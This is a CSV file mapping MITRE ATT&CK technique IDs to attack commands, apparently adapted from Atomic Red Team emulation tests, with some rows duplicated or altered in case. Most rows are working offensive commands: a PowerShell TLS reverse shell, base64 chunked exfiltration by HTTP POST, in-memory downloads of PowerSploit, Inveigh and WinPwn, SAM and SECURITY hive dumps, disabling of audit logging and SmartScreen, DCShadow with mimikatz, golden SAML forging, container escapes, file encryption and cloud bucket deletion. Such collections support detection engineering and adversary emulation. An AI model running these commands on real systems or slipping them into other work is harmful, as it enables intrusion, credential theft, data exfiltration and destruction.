mitre_id,command
T1580,"export aws_region=#{aws_region} cd #{stratus_path} echo ""stratus: start warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance  "
T1572,nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args} >/dev/null 2>&1 &
T1046,for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
T1609,"docker build -t t1609 $pathtoatomicsfolder/t1609/src/ docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh docker exec -i t1609_container bash -c ""cat /tmp/output.txt"""
T1040,sudo #{program_path} -a -t 3 # id_1192
T1124,get-date # id_5604
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y"
T1195,"copy %temp%\explorersync.db %temp%\..\microsoft\explorersync.db schtasks /create /tn explorersync /tr ""javaw -jar %temp%\..\microsoft\explorersync.db"" /sc minute /f # id_1649"
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;"
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh  
T1095,"cmd /c ""#{ncat_exe}"" #{server_ip} #{server_port}"
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt} 
T1555,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-sharpweb.ps1') invoke-sharpweb -command ""all""   "
T1115,echo get-process | clip get-clipboard | iex   
T1613,docker build -t t1613 $pathtoatomicsfolder/t1613/src/ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)
T1040,pktmon.exe start --etw -f %temp%\t1040.etl timeout /t 5 >nul 2>&1 pktmon.exe stop
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru"
T1569,launchctl submit -l #{label_name} -- #{executable_path}
T1072,# DEPLOY 7-ZIP USING CHOCOLATEY CHOCO INSTALL -Y 7ZIP
T1078,cat /etc/passwd |grep nobody pw usermod nobody -s /bin/sh echo $(openssl passwd -1 art) | pw mod user nobody -h 0 su nobody whoami exit
T1030,"$file = [system.io.file]::openread(#{source_file_path}) $chunksize = #{chunk_size} * 1kb $buffer = new-object byte[] $chunksize while ($bytesread = $file.read($buffer, 0, $buffer.length)) { $encodedchunk = [convert]::tobase64string($buffer, 0, $bytesread) invoke-webrequest -uri #{destination_url} -method post -body $encodedchunk } $file.close()"
T1559,"start ""$pathtoatomicsfolder\t1559.002\bin\dde_document.docx"" # id_6864"
T1133,"$EXTLIST = #{EXTENSION_ID} FOREACH ($EXTENSION IN $EXTLIST) { NEW-ITEM -PATH HKLM:\SOFTWARE\WOW6432NODE\GOOGLE\CHROME\EXTENSIONS\$EXTENSION -FORCE NEW-ITEMPROPERTY -PATH ""HKLM:\SOFTWARE\WOW6432NODE\GOOGLE\CHROME\EXTENSIONS\$EXTENSION"" -NAME ""UPDATE_URL"" -VALUE ""HTTPS://CLIENTS2.GOOGLE.COM/SERVICE/UPDATE2/CRX"" -PROPERTYTYPE ""STRING"" -FORCE} START CHROME START-SLEEP -SECONDS 30 STOP-PROCESS -NAME ""CHROME"""
T1484,"reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimedc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffsetdc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtime /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffset /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v enablesmartscreen /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v shellsmartscreenlevel /t reg_sz /d block /f  "
T1090,"osascript -e 'tell application ""terminal"" to do script ""tor""'"
T1220,"""#{msxsl_exe}"" ""#{xmlfile}"" ""#{xslfile}"""
T1496,yes > /dev/null
T1105,#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll #{curl_path} -k #{file_download} -o %temp%\allthethingsx64.dll
T1055,#{exe_binary}  
T1486,which_ccencrypt=`which ccencrypt` cp #{root_input_file_path} #{cped_file_path}; $which_ccencrypt -t -k #{pwd_for_encrypted_file} #{cped_file_path} # id_2184
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1609,"DOCKER BUILD -T T1609 $PATHTOATOMICSFOLDER/T1609/SRC/ DOCKER RUN --NAME T1609_CONTAINER --RM -ITD T1609 BASH /TMP/SCRIPT.SH DOCKER EXEC -I T1609_CONTAINER BASH -C ""CAT /TMP/OUTPUT.TXT"""
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer # id_2810"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer # id_2901"
T1059,#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
T1539,"killall 'google chrome' sleep 1 open -a ""/applications/google chrome.app/contents/macos/google chrome"" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/ sleep 1 /tmp/whitechocolatemacademianut/chocolate -d cookies -p 1337  "
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh
T1619,"for bucket in ""$(aws s3 ls | cut -d "" "" -f3)""; do aws s3api list-objects-v2 --bucket $bucket --output text; done # id_2038"
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""#{client_id}"" $client_secret = ""#{client_secret}"" $tenant_id = ""#{tenant_id}"" $environment = ""#{cloud}"" set-azureauthentication -clientid $client_id -clientsecret $client_secret -tenantid $tenant_id -environment $environment get-azurediscoverydata -outputdirectory ""#{output_directory}"" -environment $environment remove-blankfiles -outputdirectory ""#{output_directory}""  "
T1530,aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name} # id_4015
T1553,"sudo security add-trusted-cert -d -r trustroot -k ""/library/keychains/system.keychain"" ""#{cert_filename}""  "
T1562,"auditpol /set /category:""account logon"" /success:disable /failure:disable auditpol /set /category:""logon/logoff"" /success:disable /failure:disable auditpol /set /category:""detailed tracking"" /success:disable"
T1114,"powershell -executionpolicy bypass -command ""#{file_path}\get-inbox.ps1"" -file #{output_file}  "
T1197,bitsadmin.exe /create #{bits_job_name} bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file} bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} null bitsadmin.exe /resume #{bits_job_name} ping -n 5 127.0.0.1 >nul 2>&1 bitsadmin.exe /complete #{bits_job_name} # id_7300
T1611,"KUBECTL --CONTEXT KIND-ATOMIC-CLUSTER RUN ATOMIC-NSENTER-ESCAPE-POD --RESTART=NEVER -TI --RM --IMAGE ALPINE --OVERRIDES '{""SPEC"":{""HOSTPID"": TRUE, ""CONTAINERS"":[{""NAME"":""1"",""IMAGE"":""ALPINE"",""COMMAND"":[""NSENTER"",""--MOUNT=/PROC/1/NS/MNT"",""--"",""/BIN/BASH""],""STDIN"": TRUE,""TTY"":TRUE,""SECURITYCONTEXT"":{""PRIVILEGED"":TRUE}}]}}'"
T1222,takeown.exe /f #{file_folder_to_own} /r
T1555,"start-process ""#{file_path}\sysinternals\accesschk.exe"" -argumentlist ""-accepteula ."""
T1560,"$APPDATA=""$ENV:USERPROFILE\APPDATA"" $COPY=""#{DESTINATION_FOLDER}"" $ZIP=""#{ZIP_FILE_PATH}"" IF (TEST-PATH $COPY) { REMOVE-ITEM $COPY -RECURSE -FORCE } NEW-ITEM -ITEMTYPE DIRECTORY -PATH $COPY | OUT-NULL GET-CHILDITEM $APPDATA -RECURSE -FORCE | FOREACH-OBJECT { $REL = $_.FULLNAME.SUBSTRING($APPDATA.LENGTH + 1) $DEST = JOIN-PATH $COPY $REL IF ($_.PSISCONTAINER) { NEW-ITEM -ITEMTYPE DIRECTORY -PATH $DEST -FORCE | OUT-NULL } ELSE { COPY-ITEM $_.FULLNAME -DESTINATION $DEST -FORCE -ERRORACTION SILENTLYCONTINUE } } ADD-TYPE -ASSEMBLYNAME SYSTEM.IO.COMPRESSION.FILESYSTEM [SYSTEM.IO.COMPRESSION.ZIPFILE]::CREATEFROMDIRECTORY($COPY, $ZIP, [SYSTEM.IO.COMPRESSION.COMPRESSIONLEVEL]::OPTIMAL, $FALSE)"
T1083,"DIR /S C:\ >> #{OUTPUT_FILE} DIR /S ""C:\DOCUMENTS AND SETTINGS"" >> #{OUTPUT_FILE} DIR /S ""C:\PROGRAM FILES\"" >> #{OUTPUT_FILE} DIR ""%SYSTEMDRIVE%\USERS\*.*"" >> #{OUTPUT_FILE} DIR ""%USERPROFILE%\APPDATA\ROAMING\MICROSOFT\WINDOWS\RECENT\*.*"" >> #{OUTPUT_FILE} DIR ""%USERPROFILE%\DESKTOP\*.*"" >> #{OUTPUT_FILE} TREE /F >> #{OUTPUT_FILE}"
T1552,"find #{file_path}/.oci/sessions -name ""token"" -type f 2>/dev/null"
T1219,"start-process ""#{splashtop_path}"""
T1195,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json""  "
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru # id_4133"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \; "
T1614,chcp 
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive
T1485,gcloud config set project #{project_id} gcloud storage buckets delete gs://#{bucket_name}
T1614,reg query hkey_local_machine\system\currentcontrolset\control\nls\language   
T1047,"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall   "
T1078,new-azautomationrunbook -name #{runbook_name} -type powershell -resourcegroupname #{resource_group} -description 'my-test-runbook' -automationaccountname #{automation_account_name}  
T1562,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule echo ""starting detonate"" ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force"
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}"
T1003,reg save HKLM\SAM c:\programdata\dump.bak
T1619,"az login # login to azure # get all storage accounts in the subscription $storageaccounts = az storage account list --query ""[].{name:name, resourcegroup:resourcegroup}"" --output json | convertfrom-json $storageaccountobjects = @() $downloadedfunctionfiles = @() foreach ($account in $storageaccounts) { write-output ""`nfound storage account $($account.name)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = """" queuename = """" } $allowsharedkeyaccess = az storage account show --name $account.name --resource-group $account.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name $account.name --resource-group $account.resourcegroup --query connectionstring --output tsv $fileshares = az storage share list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($fileshare in $fileshares) { write-output ""found file share: $($fileshare)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = $fileshare containername = """" blobname = """" tablename = """" queuename = """" } } $containers = az storage container list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($container in $containers) { write-output ""found container: $($container)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = $container blobname = """" tablename = """" queuename = """" } $blobs = az storage blob list --connection-string $connectionstring --container-name $container --query ""[].name"" --output json | convertfrom-json foreach($blob in $blobs) { write-output ""found blob: $($blob)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = $container blobname = $blob tablename = """" queuename = """" } } } $tables = az storage table list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($table in $tables) { write-output ""found table: $($table)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = $table queuename = """" } } $queues = az storage queue list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($queue in $queues) { write-output ""found table: $($table)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = """" queuename = $queue } } } } # store file lists to csv file $storageaccountobjects | export-csv -path ""#{output_file}"" -notypeinformation write-output ""`ndownloaded storage account objects to #{output_file}"" # print lists that have been stored as csv file $storageaccountobjects | format-table -property resourcegroup, storageaccountname, filesharename, containername, blobname, tablename, queuename -autosize -wrap"
T1518,wmic.exe /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list # id_2193
T1221,"START ""#{DOCX_FILE}"""
T1484,"reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimedc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffsetdc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtime /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffset /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v enablesmartscreen /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v shellsmartscreenlevel /t reg_sz /d block /f"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"" # id_8294"
T1197,start-bitstransfer -priority foreground -source #{remote_file} -destination #{local_file} # id_7800
T1489,taskkill.exe /f /im #{process_name} # id_6093
T1127,"copy ""#{filename}"" %temp%\hello.js #{jscpath}\#{jscname} %temp%\hello.js"
T1070,SHRED -U #{FILE_TO_SHRED}
T1046,NMAP -PN -SV -P #{PORT_RANGE} #{HOST}
T1572,nohup code tunnel --accept-server-license-terms #{additional_args} >/dev/null 2>&1 &   
T1021,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v portnumber /t reg_dword /d #{new_remote_port} /f netsh advfirewall firewall add rule name=""rdpportlatest-tcp-in"" dir=in action=allow protocol=tcp localport=#{new_remote_port}   "
T1018,arp -a | grep -v '^?'
T1558,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-domainuser -preauthnotrequired -properties distinguishedname -verbose 
T1553,regsvr32.exe #{dll_payload} # id_3694
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n a = shell(`""cmd.exe /c wscript.exe //e:jscript #{jse_path}`"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1137,reg.exe add hkcu\software\microsoft\office\#{outlook_version}\outlook\webview\#{outlook_folder} /v url /t reg_sz /d #{url} /f
T1012,reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64 # id_7667
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" } "
T1611,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"""
T1553,regsvr32.exe #{dll_payload}
T1071,"for($i=0; $i -le #{query_volume}; $i++) { resolve-dnsname -type ""#{query_type}"" ""#{subdomain}-$(get-random -minimum 1 -maximum 999999).#{domain}"" -quicktimeout} # id_6608"
T1219,"start-process ""#{splashtop_path}"" # id_9123"
T1176,"# chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/win_x64/1153778/chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https://github.com/ublockorigin/ubol-home/releases/download/ubolite_2024.11.25.1376/ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""#{working_dir}"" set-variable progresspreference silentlycontinue invoke-webrequest -uri $chromium -outfile ""#{working_dir}\chrome.zip"" invoke-webrequest -uri $extension -outfile ""#{working_dir}\extension.zip"" expand-archive chrome.zip -destinationpath ""#{working_dir}"" -force expand-archive extension.zip -force start-process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -passthru"
T1001,"get-content ""#{image_file}"", ""#{tar_file}"" -encoding byte -readcount 0 | set-content ""#{new_image_file}"" -encoding byte "
T1113,xwd -root -out #{output_file} xwud -in #{output_file}
T1016,TEST-NETCONNECTION -COMMONTCPPORT SMB -COMPUTERNAME #{TARGET}
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;   "
T1078,net user #{guest_user} /active:yes # id_7337
T1562,"echo ""# this is a comment"" >> /etc/default/ufw grep ""# this is a comment"" /etc/default/ufw"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive) "
T1003,reg export hklm\sam %temp%\sam reg export hklm\system %temp%\system reg export hklm\security %temp%\security
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \; # id_2430"
T1553,xattr -d com.apple.quarantine #{app_path} 
T1027,"$originalcommand = '#{powershell_command}' $bytes = [system.text.encoding]::unicode.getbytes($originalcommand) $encodedcommand =[convert]::tobase64string($bytes) $encodedcommand set-itemproperty -force -path #{registry_key_storage} -name #{registry_entry_storage} -value $encodedcommand powershell.exe -command ""iex ([text.encoding]::unicode.getstring([convert]::frombase64string((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"" # id_7549"
T1113,xwd -root -out #{output_file} xwud -in #{output_file}   
T1571,echo quit | telnet #{domain} #{port} exit 0
T1036,"copy ""#{inputfile}"" #{outputfile} $myt1036_003 = (start-process -passthru -filepath #{outputfile}).id stop-process -id $myt1036_003 # id_6067"
T1127,"copy ""#{filename}"" %temp%\libhello.js #{jscpath}\#{jscname} /t:library %temp%\libhello.js # id_2439"
T1486,"echo ""#{pwd_for_encrypted_file}"" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}"
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{bat_path}`"" for output as #1`n write #1, `""calc.exe`""`n close #1`n a = shell(`""cmd.exe /c #{bat_path} `"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct #{ms_product}  "
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`"""" $dc = start-process -filepath cmd.exe -verb runas -argumentlist ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzparam"" # wait for fake dc server to be ready... start-sleep -seconds 5 # server ready, so trigger replication (push) and wait until it finished & ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1197,"set ""#{download_path}"" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventname:desktopimgdownldr  "
T1574,"$env:cor_enable_profiling = 1 $env:cor_profiler = '#{clsid_guid}' $env:cor_profiler_path = '""#{file_name}""' powershell -c 'start-sleep 1'"
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"""
